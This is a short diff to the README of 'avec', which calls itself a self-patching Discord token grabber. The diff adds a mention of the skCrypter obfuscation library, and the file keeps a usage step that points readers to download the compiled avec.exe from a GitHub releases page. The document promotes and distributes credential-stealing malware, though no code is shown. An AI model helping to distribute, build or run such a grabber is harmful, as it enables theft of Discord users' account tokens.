@@ -1,6 +1,8 @@
 # avec
 A small self-patch Discord token grabber
 
+### Used Libraries
+[skCrypter](https://github.com/skadro-official/skCrypter/)
 ## Usage
 ### *Without Compiler*
 1. Download `avec.exe` from `https://github.com/juvoy/avec/releases`
